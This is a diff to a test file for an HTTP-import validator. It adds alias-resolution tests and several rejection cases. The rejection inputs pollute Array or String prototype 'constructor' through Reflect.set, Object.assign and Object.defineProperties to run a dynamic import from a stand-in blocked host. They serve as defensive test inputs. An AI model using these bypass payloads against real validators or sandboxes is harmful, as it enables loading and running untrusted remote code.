@@ -1,5 +1,5 @@
 import "#veryfront/schemas/_test-setup.ts";
-import { assertEquals, assertRejects } from "#veryfront/testing/assert.ts";
+import { assert, assertEquals, assertRejects } from "#veryfront/testing/assert.ts";
 import { describe, it } from "#veryfront/testing/bdd.ts";
 import { dirname, fromFileUrl } from "#veryfront/compat/path";
 import {
@@ -1338,6 +1338,34 @@ describe("routing/api/module-loader/http-validator", () => {
       }
     });
 
+    it("should keep property copies onto literal-backed aliases out of prototype invalidation", async () => {
+      // Every initializer of the target resolves to the same fresh object, so
+      // the copy lands on a tracked object; neither a repeated alias nor a
+      // block-scoped alias of a hoisted `var` may look like an unknown target.
+      const sources = [
+        `const base = {}; let target = base; target = base; const props = { x: 1 };` +
+        ` Object.assign(target, props); export function f(i) { return [1, 2][i]; }`,
+        `{ const base = {}; var target = base; const props = { x: 1 }; Object.assign(target, props); }` +
+        ` export function f(i) { return [1, 2][i]; }`,
+      ];
+      for (const source of sources) {
+        const scan = await validateHTTPImports(source, []);
+        assertEquals(scan.specifiers, [], source);
+      }
+    });
+
+    it("should resolve long alias chains with repeated initializers in linear time", async () => {
+      let source = "const a0 = {};";
+      for (let i = 1; i <= 40; i++) source += ` let a${i} = a${i - 1}; a${i} = a${i - 1};`;
+      source += " const props = { x: 1 }; Object.assign(a40, props);" +
+        " export function f(i) { return [1, 2][i]; }";
+      const started = performance.now();
+      const scan = await validateHTTPImports(source, []);
+      const elapsed = performance.now() - started;
+      assertEquals(scan.specifiers, []);
+      assert(elapsed < 1_000, `alias chain took ${elapsed.toFixed(0)}ms`);
+    });
+
     it("should keep indexed writes with numeric or symbol keys out of prototype invalidation", async () => {
       // `arr[i] = v` cannot name `__proto__`; it must neither mark `arr` as
       // prototype-mutated nor switch the module's exemptions off.
@@ -1552,6 +1580,17 @@ describe("routing/api/module-loader/http-validator", () => {
         `const local = (s) => s; const key = ["con", "structor"].join("");` +
         ` Object.defineProperty(Array.prototype, key, { value: local });` +
         ` [].constructor('return import("https://blocked.example/mod.js")')();`,
+        // `Reflect.set` writes any key, and a caller-supplied value may be anything.
+        `export function f(make) { Reflect.set(Array.prototype, "constructor", make);` +
+        ` return [].constructor('return import("https://blocked.example/mod.js")')(); }`,
+        `export function f(make) { Reflect.set({}, "constructor", make, Array.prototype);` +
+        ` return [].constructor('return import("https://blocked.example/mod.js")')(); }`,
+        // An identifier target may alias an intrinsic prototype.
+        `export function f(make) { const p = Array.prototype; const props = { constructor: make };` +
+        ` Object.assign(p, props); return [].constructor('return import("https://blocked.example/mod.js")')(); }`,
+        `export function f(make) { const p = String.prototype; const descriptors = { constructor: { value: make } };` +
+        ` Object.defineProperties(p, descriptors);` +
+        ` return "x".constructor('return import("https://blocked.example/mod.js")')(); }`,
       ];
       for (const source of sources) {
         await assertRejects(
